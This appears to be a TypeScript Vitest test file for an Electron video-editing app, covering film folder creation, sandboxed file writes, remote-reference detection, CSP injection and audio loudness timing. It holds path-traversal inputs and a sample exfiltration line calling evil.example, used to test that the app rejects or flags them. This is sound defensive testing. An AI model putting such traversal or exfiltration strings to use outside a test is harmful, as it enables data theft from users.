import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { execFile } from "node:child_process";
import { promisify } from "node:util";
import { promises as fs } from "node:fs";
import { createRequire } from "node:module";
import os from "node:os";
import path from "node:path";
import { Films, envelopeFromSamples, remoteReferences, slug, withCsp } from "../electron/core/film";
import { ffmpegPath } from "../electron/core/media";

const exec = promisify(execFile);
let dir: string, films: Films;

beforeAll(async () => {
  dir = await fs.mkdtemp(path.join(os.tmpdir(), "cutroom-films-"));
  films = new Films(
    path.join(dir, "filmes"),
    path.resolve("resources/film-kit"),
    createRequire(import.meta.url).resolve("gsap/dist/gsap.min.js"),
  );
});
afterAll(() => fs.rm(dir, { recursive: true, force: true }));

describe("films", () => {
  it("creates a self-contained film folder that passes the static check", async () => {
    const film = await films.create({
      name: "Curtida ou assinatura?",
      aspect: "9:16",
      brand: {
        name: "Carrossell",
        context: "SaaS",
        palette: { accent: "#ff5a36", ink: "#000000", paper: "#ffffff" },
        logo: "data:image/png;base64,iVBORw0KGgo=",
        source: "manual",
        updatedAt: "",
      },
    });
    expect(film.id).toBe("curtida-ou-assinatura");
    expect([film.width, film.height]).toEqual([1080, 1920]);
    expect(film.files).toEqual(
      expect.arrayContaining(["index.html", "CUTROOM.md", "brand.js", "timing.js", "film.json", "kit/cutroom-kit.js", "kit/gsap.min.js", "assets/logo.png"]),
    );
    expect(await fs.readFile(path.join(film.path, "fonts", "Anton-Regular.ttf"))).toBeTruthy();
    expect(await fs.readFile(path.join(film.path, "brand.js"), "utf8")).toContain('"accent":"#ff5a36"');
    const report = await films.check(film.id);
    expect(report.errors).toEqual([]);
    expect((await films.create({ name: "Curtida ou assinatura?" })).id).toBe("curtida-ou-assinatura-2");
    expect((await films.list()).map((f) => f.id).sort()).toEqual(["curtida-ou-assinatura", "curtida-ou-assinatura-2"]);
  });

  it("keeps writes inside the film folder and to text files", async () => {
    const id = "curtida-ou-assinatura";
    await expect(films.writeFile(id, "../fora.html", "x")).rejects.toThrow(/dentro da pasta/);
    await expect(films.writeFile(id, "C:/Windows/x.html", "x")).rejects.toThrow(/dentro da pasta/);
    await expect(films.writeFile(id, "run.exe", "x")).rejects.toThrow(/Só arquivos de texto/);
    await expect(films.writeFile(id, "timing.js", "x")).rejects.toThrow(/CutRoom/);
    await expect(films.readFile(id, "../../segredo.json")).rejects.toThrow(/dentro da pasta/);
    expect(await films.writeFile(id, "scenes/demo.js", "window.demo = 1;")).toEqual({ path: "scenes/demo.js", bytes: 16 });
    expect(() => films.dir("../x")).toThrow(/inválido/);
  });

  it("refuses remote URLs and missing files before rendering", async () => {
    const id = "curtida-ou-assinatura";
    const html = (await films.readFile(id, "index.html")).content;
    await films.writeFile(
      id,
      "index.html",
      html.replace("</head>", '<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter"><script src="nao-existe.js"></script></head>'),
    );
    const report = await films.check(id);
    expect(report.ok).toBe(false);
    expect(report.errors.join("\n")).toMatch(/referência externa https:\/\/fonts\.googleapis\.com/);
    expect(report.errors.join("\n")).toMatch(/não encontrado: nao-existe\.js/);
    await films.writeFile(id, "index.html", html);
    expect((await films.check(id)).errors).toEqual([]);
  });

  it("writes timing.js with words and a per-frame loudness envelope", async () => {
    const voice = path.join(dir, "voz.wav");
    await exec(ffmpegPath, ["-v", "error", "-y", "-f", "lavfi", "-i", "sine=frequency=220:sample_rate=48000:duration=1", "-af", "volume=0:enable='lt(t,0.5)'", voice]);
    const set = await films.setVoice("curtida-ou-assinatura", {
      file: voice,
      duration: 1,
      words: [
        { text: "Mil", start: 0.5, end: 0.7 },
        { text: "curtidas.", start: 0.7, end: 0.95 },
      ],
    });
    expect(set).toMatchObject({ file: "assets/voice.wav", voiceEnd: 0.95 });
    const timing = await fs.readFile(path.join(dir, "filmes", "curtida-ou-assinatura", "timing.js"), "utf8");
    const value = JSON.parse(timing.replace(/^window\.TIMING = /, "").replace(/;\s*$/, ""));
    expect(value.envelope.fps).toBe(30);
    expect(value.envelope.db.length).toBe(30);
    expect(Math.max(...value.envelope.db.slice(0, 14))).toBeLessThan(-80);
    expect(Math.min(...value.envelope.db.slice(16))).toBeGreaterThan(-30);
    const check = await films.check("curtida-ou-assinatura");
    expect(check.warnings.join("\n")).toMatch(/assets\/voice\.wav/);
  });
});

describe("film helpers", () => {
  it("finds remote references but not XML namespaces", () => {
    expect(remoteReferences('<svg xmlns="http://www.w3.org/2000/svg"></svg>')).toEqual([]);
    expect(remoteReferences("fetch('https://evil.example/x?d=' + data)")).toEqual(["https://evil.example/x?d="]);
    expect(remoteReferences("new WebSocket('wss://h.example')")).toEqual(["wss://h.example"]);
  });
  it("injects the render CSP right after <head>", () => {
    expect(withCsp("<html><head><title>x</title></head></html>")).toMatch(/^<html><head><meta http-equiv="Content-Security-Policy" content="default-src 'self'/);
    expect(withCsp("<div></div>")).toMatch(/^<meta http-equiv="Content-Security-Policy"/);
  });
  it("computes loudness per frame and safe slugs", () => {
    const loud = new Float32Array(3200).fill(0.5);
    expect(envelopeFromSamples(loud, 48000, 30)).toEqual([-6, -6]);
    expect(slug("Ação: 3 níveis!")).toBe("acao-3-niveis");
    expect(slug("***")).toBe("filme");
  });
});
